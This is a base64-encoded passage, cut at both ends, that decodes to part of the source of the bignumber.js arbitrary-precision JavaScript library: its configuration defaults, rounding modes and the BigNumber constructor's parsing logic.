gc2lnbmlmaWNhbnQgZGlnaXRzOiAnLFxyXG5cclxuICAgIEJBU0UgPSAxZTE0LFxyXG4gICAgTE9HX0JBU0UgPSAxNCxcclxuICAgIE1BWF9TQUZFX0lOVEVHRVIgPSAweDFmZmZmZmZmZmZmZmZmLCAgICAgICAgIC8vIDJeNTMgLSAxXHJcbiAgICAvLyBNQVhfSU5UMzIgPSAweDdmZmZmZmZmLCAgICAgICAgICAgICAgICAgICAvLyAyXjMxIC0gMVxyXG4gICAgUE9XU19URU4gPSBbMSwgMTAsIDEwMCwgMWUzLCAxZTQsIDFlNSwgMWU2LCAxZTcsIDFlOCwgMWU5LCAxZTEwLCAxZTExLCAxZTEyLCAxZTEzXSxcclxuICAgIFNRUlRfQkFTRSA9IDFlNyxcclxuXHJcbiAgICAvLyBFRElUQUJMRVxyXG4gICAgLy8gVGhlIGxpbWl0IG9uIHRoZSB2YWx1ZSBvZiBERUNJTUFMX1BMQUNFUywgVE9fRVhQX05FRywgVE9fRVhQX1BPUywgTUlOX0VYUCwgTUFYX0VYUCwgYW5kXHJcbiAgICAvLyB0aGUgYXJndW1lbnRzIHRvIHRvRXhwb25lbnRpYWwsIHRvRml4ZWQsIHRvRm9ybWF0LCBhbmQgdG9QcmVjaXNpb24uXHJcbiAgICBNQVggPSAxRTk7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyAwIHRvIE1BWF9JTlQzMlxyXG5cclxuXHJcbiAgLypcclxuICAgKiBDcmVhdGUgYW5kIHJldHVybiBhIEJpZ051bWJlciBjb25zdHJ1Y3Rvci5cclxuICAgKi9cclxuICBmdW5jdGlvbiBjbG9uZShjb25maWdPYmplY3QpIHtcclxuICAgIHZhciBkaXYsIGNvbnZlcnRCYXNlLCBwYXJzZU51bWVyaWMsXHJcbiAgICAgIFAgPSBCaWdOdW1iZXIucHJvdG90eXBlID0geyBjb25zdHJ1Y3RvcjogQmlnTnVtYmVyLCB0b1N0cmluZzogbnVsbCwgdmFsdWVPZjogbnVsbCB9LFxyXG4gICAgICBPTkUgPSBuZXcgQmlnTnVtYmVyKDEpLFxyXG5cclxuXHJcbiAgICAgIC8vLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gRURJVEFCTEUgQ09ORklHIERFRkFVTFRTIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1cclxuXHJcblxyXG4gICAgICAvLyBUaGUgZGVmYXVsdCB2YWx1ZXMgYmVsb3cgbXVzdCBiZSBpbnRlZ2VycyB3aXRoaW4gdGhlIGluY2x1c2l2ZSByYW5nZXMgc3RhdGVkLlxyXG4gICAgICAvLyBUaGUgdmFsdWVzIGNhbiBhbHNvIGJlIGNoYW5nZWQgYXQgcnVuLXRpbWUgdXNpbmcgQmlnTnVtYmVyLnNldC5cclxuXHJcbiAgICAgIC8vIFRoZSBtYXhpbXVtIG51bWJlciBvZiBkZWNpbWFsIHBsYWNlcyBmb3Igb3BlcmF0aW9ucyBpbnZvbHZpbmcgZGl2aXNpb24uXHJcbiAgICAgIERFQ0lNQUxfUExBQ0VTID0gMjAsICAgICAgICAgICAgICAgICAgICAgLy8gMCB0byBNQVhcclxuXHJcbiAgICAgIC8vIFRoZSByb3VuZGluZyBtb2RlIHVzZWQgd2hlbiByb3VuZGluZyB0byB0aGUgYWJvdmUgZGVjaW1hbCBwbGFjZXMsIGFuZCB3aGVuIHVzaW5nXHJcbiAgICAgIC8vIHRvRXhwb25lbnRpYWwsIHRvRml4ZWQsIHRvRm9ybWF0IGFuZCB0b1ByZWNpc2lvbiwgYW5kIHJvdW5kIChkZWZhdWx0IHZhbHVlKS5cclxuICAgICAgLy8gVVAgICAgICAgICAwIEF3YXkgZnJvbSB6ZXJvLlxyXG4gICAgICAvLyBET1dOICAgICAgIDEgVG93YXJkcyB6ZXJvLlxyXG4gICAgICAvLyBDRUlMICAgICAgIDIgVG93YXJkcyArSW5maW5pdHkuXHJcbiAgICAgIC8vIEZMT09SICAgICAgMyBUb3dhcmRzIC1JbmZpbml0eS5cclxuICAgICAgLy8gSEFMRl9VUCAgICA0IFRvd2FyZHMgbmVhcmVzdCBuZWlnaGJvdXIuIElmIGVxdWlkaXN0YW50LCB1cC5cclxuICAgICAgLy8gSEFMRl9ET1dOICA1IFRvd2FyZHMgbmVhcmVzdCBuZWlnaGJvdXIuIElmIGVxdWlkaXN0YW50LCBkb3duLlxyXG4gICAgICAvLyBIQUxGX0VWRU4gIDYgVG93YXJkcyBuZWFyZXN0IG5laWdoYm91ci4gSWYgZXF1aWRpc3RhbnQsIHRvd2FyZHMgZXZlbiBuZWlnaGJvdXIuXHJcbiAgICAgIC8vIEhBTEZfQ0VJTCAgNyBUb3dhcmRzIG5lYXJlc3QgbmVpZ2hib3VyLiBJZiBlcXVpZGlzdGFudCwgdG93YXJkcyArSW5maW5pdHkuXHJcbiAgICAgIC8vIEhBTEZfRkxPT1IgOCBUb3dhcmRzIG5lYXJlc3QgbmVpZ2hib3VyLiBJZiBlcXVpZGlzdGFudCwgdG93YXJkcyAtSW5maW5pdHkuXHJcbiAgICAgIFJPVU5ESU5HX01PREUgPSA0LCAgICAgICAgICAgICAgICAgICAgICAgLy8gMCB0byA4XHJcblxyXG4gICAgICAvLyBFWFBPTkVOVElBTF9BVCA6IFtUT19FWFBfTkVHICwgVE9fRVhQX1BPU11cclxuXHJcbiAgICAgIC8vIFRoZSBleHBvbmVudCB2YWx1ZSBhdCBhbmQgYmVuZWF0aCB3aGljaCB0b1N0cmluZyByZXR1cm5zIGV4cG9uZW50aWFsIG5vdGF0aW9uLlxyXG4gICAgICAvLyBOdW1iZXIgdHlwZTogLTdcclxuICAgICAgVE9fRVhQX05FRyA9IC03LCAgICAgICAgICAgICAgICAgICAgICAgICAvLyAwIHRvIC1NQVhcclxuXHJcbiAgICAgIC8vIFRoZSBleHBvbmVudCB2YWx1ZSBhdCBhbmQgYWJvdmUgd2hpY2ggdG9TdHJpbmcgcmV0dXJucyBleHBvbmVudGlhbCBub3RhdGlvbi5cclxuICAgICAgLy8gTnVtYmVyIHR5cGU6IDIxXHJcbiAgICAgIFRPX0VYUF9QT1MgPSAyMSwgICAgICAgICAgICAgICAgICAgICAgICAgLy8gMCB0byBNQVhcclxuXHJcbiAgICAgIC8vIFJBTkdFIDogW01JTl9FWFAsIE1BWF9FWFBdXHJcblxyXG4gICAgICAvLyBUaGUgbWluaW11bSBleHBvbmVudCB2YWx1ZSwgYmVuZWF0aCB3aGljaCB1bmRlcmZsb3cgdG8gemVybyBvY2N1cnMuXHJcbiAgICAgIC8vIE51bWJlciB0eXBlOiAtMzI0ICAoNWUtMzI0KVxyXG4gICAgICBNSU5fRVhQID0gLTFlNywgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIC0xIHRvIC1NQVhcclxuXHJcbiAgICAgIC8vIFRoZSBtYXhpbXVtIGV4cG9uZW50IHZhbHVlLCBhYm92ZSB3aGljaCBvdmVyZmxvdyB0byBJbmZpbml0eSBvY2N1cnMuXHJcbiAgICAgIC8vIE51bWJlciB0eXBlOiAgMzA4ICAoMS43OTc2OTMxMzQ4NjIzMTU3ZSszMDgpXHJcbiAgICAgIC8vIEZvciBNQVhfRVhQID4gMWU3LCBlLmcuIG5ldyBCaWdOdW1iZXIoJzFlMTAwMDAwMDAwJykucGx1cygxKSBtYXkgYmUgc2xvdy5cclxuICAgICAgTUFYX0VYUCA9IDFlNywgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyAxIHRvIE1BWFxyXG5cclxuICAgICAgLy8gV2hldGhlciB0byB1c2UgY3J5cHRvZ3JhcGhpY2FsbHktc2VjdXJlIHJhbmRvbSBudW1iZXIgZ2VuZXJhdGlvbiwgaWYgYXZhaWxhYmxlLlxyXG4gICAgICBDUllQVE8gPSBmYWxzZSwgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIHRydWUgb3IgZmFsc2VcclxuXHJcbiAgICAgIC8vIFRoZSBtb2R1bG8gbW9kZSB1c2VkIHdoZW4gY2FsY3VsYXRpbmcgdGhlIG1vZHVsdXM6IGEgbW9kIG4uXHJcbiAgICAgIC8vIFRoZSBxdW90aWVudCAocSA9IGEgLyBuKSBpcyBjYWxjdWxhdGVkIGFjY29yZGluZyB0byB0aGUgY29ycmVzcG9uZGluZyByb3VuZGluZyBtb2RlLlxyXG4gICAgICAvLyBUaGUgcmVtYWluZGVyIChyKSBpcyBjYWxjdWxhdGVkIGFzOiByID0gYSAtIG4gKiBxLlxyXG4gICAgICAvL1xyXG4gICAgICAvLyBVUCAgICAgICAgMCBUaGUgcmVtYWluZGVyIGlzIHBvc2l0aXZlIGlmIHRoZSBkaXZpZGVuZCBpcyBuZWdhdGl2ZSwgZWxzZSBpcyBuZWdhdGl2ZS5cclxuICAgICAgLy8gRE9XTiAgICAgIDEgVGhlIHJlbWFpbmRlciBoYXMgdGhlIHNhbWUgc2lnbiBhcyB0aGUgZGl2aWRlbmQuXHJcbiAgICAgIC8vICAgICAgICAgICAgIFRoaXMgbW9kdWxvIG1vZGUgaXMgY29tbW9ubHkga25vd24gYXMgJ3RydW5jYXRlZCBkaXZpc2lvbicgYW5kIGlzXHJcbiAgICAgIC8vICAgICAgICAgICAgIGVxdWl2YWxlbnQgdG8gKGEgJSBuKSBpbiBKYXZhU2NyaXB0LlxyXG4gICAgICAvLyBGTE9PUiAgICAgMyBUaGUgcmVtYWluZGVyIGhhcyB0aGUgc2FtZSBzaWduIGFzIHRoZSBkaXZpc29yIChQeXRob24gJSkuXHJcbiAgICAgIC8vIEhBTEZfRVZFTiA2IFRoaXMgbW9kdWxvIG1vZGUgaW1wbGVtZW50cyB0aGUgSUVFRSA3NTQgcmVtYWluZGVyIGZ1bmN0aW9uLlxyXG4gICAgICAvLyBFVUNMSUQgICAgOSBFdWNsaWRpYW4gZGl2aXNpb24uIHEgPSBzaWduKG4pICogZmxvb3IoYSAvIGFicyhuKSkuXHJcbiAgICAgIC8vICAgICAgICAgICAgIFRoZSByZW1haW5kZXIgaXMgYWx3YXlzIHBvc2l0aXZlLlxyXG4gICAgICAvL1xyXG4gICAgICAvLyBUaGUgdHJ1bmNhdGVkIGRpdmlzaW9uLCBmbG9vcmVkIGRpdmlzaW9uLCBFdWNsaWRpYW4gZGl2aXNpb24gYW5kIElFRUUgNzU0IHJlbWFpbmRlclxyXG4gICAgICAvLyBtb2RlcyBhcmUgY29tbW9ubHkgdXNlZCBmb3IgdGhlIG1vZHVsdXMgb3BlcmF0aW9uLlxyXG4gICAgICAvLyBBbHRob3VnaCB0aGUgb3RoZXIgcm91bmRpbmcgbW9kZXMgY2FuIGFsc28gYmUgdXNlZCwgdGhleSBtYXkgbm90IGdpdmUgdXNlZnVsIHJlc3VsdHMuXHJcbiAgICAgIE1PRFVMT19NT0RFID0gMSwgICAgICAgICAgICAgICAgICAgICAgICAgLy8gMCB0byA5XHJcblxyXG4gICAgICAvLyBUaGUgbWF4aW11bSBudW1iZXIgb2Ygc2lnbmlmaWNhbnQgZGlnaXRzIG9mIHRoZSByZXN1bHQgb2YgdGhlIGV4cG9uZW50aWF0ZWRCeSBvcGVyYXRpb24uXHJcbiAgICAgIC8vIElmIFBPV19QUkVDSVNJT04gaXMgMCwgdGhlcmUgd2lsbCBiZSB1bmxpbWl0ZWQgc2lnbmlmaWNhbnQgZGlnaXRzLlxyXG4gICAgICBQT1dfUFJFQ0lTSU9OID0gMCwgICAgICAgICAgICAgICAgICAgIC8vIDAgdG8gTUFYXHJcblxyXG4gICAgICAvLyBUaGUgZm9ybWF0IHNwZWNpZmljYXRpb24gdXNlZCBieSB0aGUgQmlnTnVtYmVyLnByb3RvdHlwZS50b0Zvcm1hdCBtZXRob2QuXHJcbiAgICAgIEZPUk1BVCA9IHtcclxuICAgICAgICBkZWNpbWFsU2VwYXJhdG9yOiAnLicsXHJcbiAgICAgICAgZ3JvdXBTZXBhcmF0b3I6ICcsJyxcclxuICAgICAgICBncm91cFNpemU6IDMsXHJcbiAgICAgICAgc2Vjb25kYXJ5R3JvdXBTaXplOiAwLFxyXG4gICAgICAgIGZyYWN0aW9uR3JvdXBTZXBhcmF0b3I6ICdcXHhBMCcsICAgICAgLy8gbm9uLWJyZWFraW5nIHNwYWNlXHJcbiAgICAgICAgZnJhY3Rpb25Hcm91cFNpemU6IDBcclxuICAgICAgfSxcclxuXHJcbiAgICAgIC8vIFRoZSBhbHBoYWJldCB1c2VkIGZvciBiYXNlIGNvbnZlcnNpb24uXHJcbiAgICAgIC8vIEl0IG11c3QgYmUgYXQgbGVhc3QgMiBjaGFyYWN0ZXJzIGxvbmcsIHdpdGggbm8gJy4nIG9yIHJlcGVhdGVkIGNoYXJhY3Rlci5cclxuICAgICAgLy8gJzAxMjM0NTY3ODlhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ekFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaJF8nXHJcbiAgICAgIEFMUEhBQkVUID0gJzAxMjM0NTY3ODlhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5eic7XHJcblxyXG5cclxuICAgIC8vLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tXHJcblxyXG5cclxuICAgIC8vIENPTlNUUlVDVE9SXHJcblxyXG5cclxuICAgIC8qXHJcbiAgICAgKiBUaGUgQmlnTnVtYmVyIGNvbnN0cnVjdG9yIGFuZCBleHBvcnRlZCBmdW5jdGlvbi5cclxuICAgICAqIENyZWF0ZSBhbmQgcmV0dXJuIGEgbmV3IGluc3RhbmNlIG9mIGEgQmlnTnVtYmVyIG9iamVjdC5cclxuICAgICAqXHJcbiAgICAgKiBuIHtudW1iZXJ8c3RyaW5nfEJpZ051bWJlcn0gQSBudW1lcmljIHZhbHVlLlxyXG4gICAgICogW2JdIHtudW1iZXJ9IFRoZSBiYXNlIG9mIG4uIEludGVnZXIsIDIgdG8gQUxQSEFCRVQubGVuZ3RoIGluY2x1c2l2ZS5cclxuICAgICAqL1xyXG4gICAgZnVuY3Rpb24gQmlnTnVtYmVyKG4sIGIpIHtcclxuICAgICAgdmFyIGFscGhhYmV0LCBjLCBjYXNlQ2hhbmdlZCwgZSwgaSwgaXNOdW0sIGxlbiwgc3RyLFxyXG4gICAgICAgIHggPSB0aGlzO1xyXG5cclxuICAgICAgLy8gRW5hYmxlIGNvbnN0cnVjdG9yIHVzYWdlIHdpdGhvdXQgbmV3LlxyXG4gICAgICBpZiAoISh4IGluc3RhbmNlb2YgQmlnTnVtYmVyKSkge1xyXG5cclxuICAgICAgICAvLyBEb24ndCB0aHJvdyBvbiBjb25zdHJ1Y3RvciBjYWxsIHdpdGhvdXQgbmV3ICgjODEpLlxyXG4gICAgICAgIC8vICdbQmlnTnVtYmVyIEVycm9yXSBDb25zdHJ1Y3RvciBjYWxsIHdpdGhvdXQgbmV3OiB7bn0nXHJcbiAgICAgICAgLy90aHJvdyBFcnJvcihiaWdudW1iZXJFcnJvciArICcgQ29uc3RydWN0b3IgY2FsbCB3aXRob3V0IG5ldzogJyArIG4pO1xyXG4gICAgICAgIHJldHVybiBuZXcgQmlnTnVtYmVyKG4sIGIpO1xyXG4gICAgICB9XHJcblxyXG4gICAgICBpZiAoYiA9PSBudWxsKSB7XHJcblxyXG4gICAgICAgIC8vIER1cGxpY2F0ZS5cclxuICAgICAgICBpZiAobiBpbnN0YW5jZW9mIEJpZ051bWJlcikge1xyXG4gICAgICAgICAgeC5zID0gbi5zO1xyXG4gICAgICAgICAgeC5lID0gbi5lO1xyXG4gICAgICAgICAgeC5jID0gKG4gPSBuLmMpID8gbi5zbGljZSgpIDogbjtcclxuICAgICAgICAgIHJldHVybjtcclxuICAgICAgICB9XHJcblxyXG4gICAgICAgIGlzTnVtID0gdHlwZW9mIG4gPT0gJ251bWJlcic7XHJcblxyXG4gICAgICAgIGlmIChpc051bSAmJiBuICogMCA9PSAwKSB7XHJcblxyXG4gICAgICAgICAgLy8gVXNlIGAxIC8gbmAgdG8gaGFuZGxlIG1pbnVzIHplcm8gYWxzby5cclxuICAgICAgICAgIHgucyA9IDEgLyBuIDwgMCA/IChuID0gLW4sIC0xKSA6IDE7XHJcblxyXG4gICAgICAgICAgLy8gRmFzdGVyIHBhdGggZm9yIGludGVnZXJzLlxyXG4gICAgICAgICAgaWYgKG4gPT09IH5+bikge1xyXG4gICAgICAgICAgICBmb3IgKGUgPSAwLCBpID0gbjsgaSA+PSAxMDsgaSAvPSAxMCwgZSsrKTtcclxuICAgICAgICAgICAgeC5lID0gZTtcclxuICAgICAgICAgICAgeC5jID0gW25dO1xyXG4gICAgICAgICAgICByZXR1cm47XHJcbiAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgc3RyID0gbiArICcnO1xyXG4gICAgICAgIH0gZWxzZSB7XHJcbiAgICAgICAgICBpZiAoIWlzTnVtZXJpYy50ZXN0KHN0ciA9IG4gKyAnJykpIHJldHVybiBwYXJzZU51bWVyaWMoeCwgc3RyLCBpc051bSk7XHJcbiAgICAgICAgICB4LnMgPSBzdHIuY2hhckNvZGVBdCgwKSA9PSA0NSA/IChzdHIgPSBzdHIuc2xpY2UoMSksIC0xKSA6IDE7XHJcbiAgICAgICAgfVxyXG5cclxuICAgICAgICAvLyBEZWNpbWFsIHBvaW50P1xyXG4gICAgICAgIGlmICgoZSA9IHN0ci5pbmRleE9mKCcuJykpID4gLTEpIHN0ciA9IHN0ci5yZXBsYWNlKCcuJywgJycpO1xyXG5cclxuICAgICAgICAvLyBFeHBvbmVudGlhbCBmb3JtP1xyXG4gICAgICAgIGlmICgoaSA9IHN0ci5zZWFyY2goL2UvaSkpID4gMCkge1xyXG5cclxuICAgICAgICAgIC8vIERldGVybWluZSBleHBvbmVudC5cclxuICAgICAgICAgIGlmIChlIDwgMCkgZSA9IGk7XHJcbiAgICAgICAgICBlICs9ICtzdHIuc2xpY2UoaSArIDEpO1xyXG4gICAgICAgICAgc3RyID0gc3RyLnN1YnN0cmluZygwLCBpKTtcclxuICAgICAgICB9IGVsc2UgaWYgKGUgPCAwKSB7XHJcblxyXG4gICAgICAgICAgLy8gSW50ZWdlci5cclxuICAgICAgICAgIGUgPSBzdHIubGVuZ3RoO1xyXG4gICAgICAgIH1cclxuXHJcbiAgICAgIH0gZWxzZSB7XHJcblxyXG4gICAgICAgIC8vICdbQmlnTnVtYmVyIEVycm9yXSBCYXNlIHtub3QgYSBwcmltaXRpdmUgbnVtYmVyfG5vdCBhbiBpbnRlZ2VyfG91dCBvZiByYW5nZX06IHtifSdcclxuICAgICAgICBpbnRDaGVjayhiLCAyLCBBTFBIQUJFVC5sZW5ndGgsICdCYXNlJyk7XHJcbiAgICAgICAgc3RyID0gbiArICcnO1xyXG5cclxuICAgICAgICAvLyBBbGxvdyBleHBvbmVudGlhbCBub3RhdGlvbiB0byBiZSB1c2VkIHdpdGggYmFzZSAxMCBhcmd1bWVudCwgd2hpbGVcclxuICAgICAgICAvLyBhbHNvIHJvdW5kaW5nIHRvIERFQ0lNQUxfUExBQ0VTIGFzIHdpdGggb3RoZXIgYmFzZXMuXHJcbiAgICAgICAgaWYgKGIgPT0gMTApIHtcclxuICAgICAgICAgIHggPSBuZXcgQmlnTnVtYmVyKG4gaW5zdGFuY2VvZiBCaWdOdW1iZXIgPyBuIDogc3RyKTtcclxuICAgICAgICAgIHJldHVybiByb3VuZCh4LCBERUNJTUFMX1BMQUNFUyArIHguZSArIDEsIFJPVU5ESU5HX01PREUpO1xyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgaXNOdW0gPSB0eXBlb2YgbiA9PSAnbnVtYmVyJztcclxuXHJcbiAgICAgICAgaWYgKGlzTnVtKSB7XHJcblxyXG4gICAgICAgICAgLy8gQXZvaWQgcG90ZW50aWFsIGludGVycHJldGF0aW9uIG9mIEluZmluaXR5IGFuZCBOYU4gYXMgYmFzZSA0NCsgdmFsdWVzLlxyXG4gICAgICAgICAgaWYgKG4gKiAwICE9IDApIHJldHVybiBwYXJzZU51bWVyaWMoeCwgc3RyLCBpc051bSwgYik7XHJcblxyXG4gICAgICAgICAgeC5zID0gMSAvIG4gPCAwID8gKHN0ciA9IHN0ci5zbGljZSgxKSwgLTEpIDogMTtcclxuXHJcbiAgICAgICAgICAvLyAnW0JpZ051bWJlciBFcnJvcl0gTnVtYmVyIHByaW1pdGl2ZSBoYXMgbW9yZSB0aGFuIDE1IHNpZ25pZmljYW50IGRpZ2l0czoge259J1xyXG4gICAgICAgICAgaWYgKEJpZ051bWJlci5ERUJVRyAmJiBzdHIucmVwbGFjZSgvXjBcXC4wKnxcXC4vLCAnJykubGVuZ3RoID4gMTUpIHtcclxuICAgICAgICAgICAgdGhyb3cgRXJyb3JcclxuICAgICAgICAgICAgICh0b29NYW55RGlnaXRzICsgbik7XHJcbiAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgLy8gUHJldmVudCBsYXRlciBjaGVjayBmb3IgbGVuZ3RoIG9uIGNvbnZlcnRlZCBudW1iZXIuXHJcbiAgICAgICAgICBpc051bSA9IGZhbHNlO1xyXG4gICAgICAgIH0gZWxzZSB7XHJcbiAgICAgICAgICB4LnMgPSBzdHIuY2hhckNvZGVBdCgwKSA9PT0gNDUgPyAoc3RyID0gc3RyLnNsaWNlKDEpLCAtMSkgOiAxO1xyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgYWxwaGFiZXQgPSBBTFBIQUJFVC5zbGljZSgwLCBiKTtcclxuICAgICAgICBlID0gaSA9IDA7XHJcblxyXG4gICAgICAgIC8vIENoZWNrIHRoYXQgc3RyIGlzIGEgdmFsaWQgYmFzZSBiIG51bWJlci5cclxuICAgICAgICAvLyBEb24ndCB1c2UgUmVnRXhwIHNvIGFscGhhYmV0IGNhbiBjb250YWluIHNwZWNpYWwgY2hhcmFjdGVycy5cclxuICAgICAgICBmb3IgKGxlbiA9IHN0ci5sZW5ndGg7IGkgPCBsZW47IGkrKykge1xyXG4gICAgICAgICAgaWYgKGFscGhhYmV0LmluZGV4T2YoYyA9IHN0ci5jaGFyQXQoaSkpIDwgMCkge1xyXG4gICAgICAgICAgICBpZiAoYyA9PSAnLicpIHtcclxuXHJcbiAgICAgICAgICAgICAgLy8gSWYgJy4nIGlzIG5vdCB0aGUgZmlyc3QgY2hhcmFjdGVyIGFuZCBpdCBoYXMgbm90IGJlIGZvdW5kIGJlZm9yZS5cclxuICAgICAgICAgICAgICBpZiAoaSA+IGUpIHtcclxuICAgICAgICAgICAgICAgIGUgPSBsZW47XHJcbiAgICAgICAgICAgICAgICBjb250aW51ZTtcclxuICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH0gZWxzZSBpZiAoIWNhc2VDaGFuZ2VkKSB7XHJcblxyXG4gICAgICAgICAgICAgIC8vIEFsbG93IGUuZy4gaGV4YWRlY2ltYWwgJ0ZGJyBhcyB3ZWxsIGFzICdmZicuXHJcbiAgICAgICAgICAgICAgaWYgKHN0ciA9PSBzdHIudG9VcHBlckNhc2UoKSAmJiAoc3RyID0gc3RyLnRvTG93ZXJDYXNlKCkpIHx8XHJcbiAgICAgICAgICAgICAgICAgIHN0ciA9PSBzdHIudG9Mb3dlckNhc2UoKSAmJiAoc3RyID0gc3RyLnRvVXBwZXJDYXNlKCkpKSB7XHJcbiAgICAgICAgICAgICAgICBjYXNlQ2hhbmdlZCA9IHRydWU7XHJcbiAgICAgICAgICAgICAgICBpID0gLTE7XHJcbiAgICAgICAgICAgICAgICBlID0gMDtcclxuICAgICAgICAgICAgICAgIGNvbnRpbnVlO1xyXG4gICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfVxyXG5cclxuICAgICAgICAgICAgcmV0dXJuIHBhcnNlTnVtZXJpYyh4LCBuICsgJycsIGlzTnVtLCBiKTtcclxuICAgICAgICAgIH1cclxuICAgICAgICB9XHJcblxyXG4gICAgICAgIHN0ciA9IGNvbnZlcnRCYXNlKHN0ciwgYiwgMTAsIHgucyk7XHJcblxyXG4gICAgICAgIC8vIERlY2ltYWwgcG9pbnQ/XHJcbiAgICAgICAgaWYgKChlID0gc3RyLmluZGV4T2YoJy4nKSkgPiAtMSkgc3RyID0gc3RyLnJlcGxhY2UoJy4nLCAnJyk7XHJcbiAgICAgICAgZWxzZSBlID0gc3RyLmxlbmd0aDtcclxuICAgICAgfVxyXG5cclxuICAgICAgLy8gRGV0ZXJtaW5lIGxlYWRpbmcgemVyb3MuXHJcbiAgICAgIGZvciAoaSA9IDA7IHN0ci5jaGFyQ29kZUF0KGkpID09PSA0ODsgaSsrKTtcclxuXHJcbiAgICAgIC8vIERldGVybWluZSB0cmFpbGluZyB6ZXJvcy5cclxuICAgICAgZm9yIChsZW4gPSBzdHIubGVuZ3RoOyBzdHIuY2hhckNvZGVBdCgtLWxlbikgPT09IDQ4Oyk7XHJcblxyXG4gICAgICBzdHIgPSBzdHIuc2xpY2UoaSwgKytsZW4pO1xyXG5cclxuICAgICAgaWYgKHN0cikge1xyXG4gICAgICAgIGxlbiAtPSBpO1xyXG5cclxuICAgICAgICAvLyAnW0JpZ051bWJlciBFcnJvcl0gTnVtYmVyIHByaW1pdGl2ZSBoYXMgbW9yZSB0aGFuIDE1IHNpZ25pZmljYW50IGRpZ2l0czoge259J1xyXG4gICAgICAgIGlmIChpc051bSAmJiBCaWdOdW1iZXIuREVCVUcgJiZcclxuICAgICAgICAgIGxlbiA+IDE1ICYmIChuID4gTUFYX1NBRkVfSU5URUdFUiB8fCBuICE9PSBtYXRoZmxvb3IobikpKSB7XHJcbiAgICAgICAgICAgIHRocm93IEVycm9yXHJcbiAgICAgICAgICAgICAodG9vTWFueURpZ2l0cyArICh4LnMgKiBuKSk7XHJcbiAgICAgICAgfVxyXG5cclxuICAgICAgICBlID0gZSAtIGkgLSAxO1xyXG5cclxuICAgICAgICAgLy8gT3ZlcmZsb3c/XHJcbiAgICAgICAgaWYgKGUgPiBNQVhfRVhQKSB7XHJcblxyXG4gICAgICAgICAgLy8gSW5maW5pdHkuXHJcbiAgICAgICAgICB4LmMgPSB4LmUgPSBudWxsO1xyXG5cclxuICAgICAgICAvLyBVbmRlcmZsb3c/XHJcbiAgICAgICAgfSBlbHNlIGlmIChlIDwgTUlOX0VYUCkge1xyXG5cclxuICAgICAgICAgIC8vIFplcm8uXHJcbiAgICAgICAgICB4LmMgPSBbeC5lID0gMF07XHJcbiAgICAgICAgfSBlbHNlIHtcclxuICAgICAgICAgIHguZSA9IGU7XHJcbiAgICAgICAgICB4LmMgPSBbXTtcclxuXHJcbiAgICAgICAgICAvLyBUcmFuc2Zvcm0gYmFzZVxyXG5cclxuICAgICAgICAgIC8vIGUgaXMgdGhlIGJhc2UgMTAgZXhwb25lbnQuXHJcbiAgICAgICAgICAvLyBpIGlzIHdoZXJlIHRvIHNsaWNlIHN0ciB0byBnZXQgdGhlIGZpcnN0IGVsZW1lbnQgb2YgdGhlIGNvZWZmaWNpZW50IGFycmF5LlxyXG4gICAgICAgICAgaSA9IChlICsgMSkgJSBMT0dfQkFTRTtcclxuICAgICAgICAgIGlmIChlIDwgMCkgaSArPSBMT0dfQkFTRTtcclxuXHJcbiAgICAgICAgICBpZiAoaSA8IGxlbikge1xyXG4gICAgICAgICAgICBpZiAoaSkgeC5jLnB1c2goK3N0ci5zbGljZSgwLCBpKSk7XHJcblxyXG4gICAgICAgICAgICBmb3IgKGxlbiAtPSBMT0dfQkFTRTsgaSA8IGxlbjspIHtcclxuICAgICAgICAgICAgICB4LmMucHVzaCgrc3RyLnNsaWNlKGksIGkgKz0gTE9HX0JBU0UpKTtcclxuICAgICAgICAgICAgfVxyXG5cclxuICAgICAgICAgICAgc3RyID0gc3RyLnNsaWNlKGkpO1xyXG4gICAgICAgICAgICBpID0gTE9HX0JBU0UgLSBzdHIubGVuZ3RoO1xyXG4gICAgICAgICAgfSBlbHNlIHtcclxuICAgICAgICAgICAgaSAtPSBsZW47XHJcbiAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgZm9yICg7IGktLTsgc3RyICs9ICcwJyk7XHJcbiAgICAgICAgICB4LmMucHVzaCgrc3RyKTtcclxuICAgICAgICB9XHJcbiAgICAgIH0gZWxzZSB7XHJcblxyXG4gICAgICAgIC8vIFplcm8uXHJcbiAgICAgICAgeC5jID0gW3guZSA9IDBdO1xyXG4gICAgICB9XHJcbiAgICB9XHJcblxyXG5cclxuICAgIC8vIENPTlNUUlVDVE9SIFBST1BFUlRJRVNcclxuXHJcblxyXG4gICAgQmlnTnVtYmVyLmNsb25lID0gY2xvbmU7XHJcblxyXG4gICAgQmlnTnVtYmVyLlJPVU5EX1VQID0gMDtcclxuICAgIEJpZ051bWJlci5ST1VORF9ET1dOID0gMTtcclxuICAgIEJpZ051bWJlci5ST1VORF9DRUlMID0gMjtcclxuICAgIEJpZ051bWJlci5ST1VORF9GTE9PUiA9IDM7XHJcbiAgICBCaWdOdW1iZXIuUk9VTkRfSEFMRl9VUCA9IDQ7XHJcbiAgICBCaWdOdW1iZXIuUk9VTkRfSEFMRl9ET1dOID0gNTtcclxuICAgIEJpZ051bWJlci5ST1VORF9IQUxGX0VWRU4gPSA2O1xyXG4gICAgQmlnTnVtYmVyLlJPVU5EX0hBTEZfQ0VJTCA9IDc7XHJcbiAgICBCaWdOdW1iZXIuUk9VTkRfSEFMRl9GTE9PUiA9IDg7XHJcbiAgICBCaWdOdW1iZXIuRVVDTElEID0gOTtcclxuXHJcblxyXG4gICAgLypcclxuICAgICAqIENvbmZpZ3VyZSBpbmZy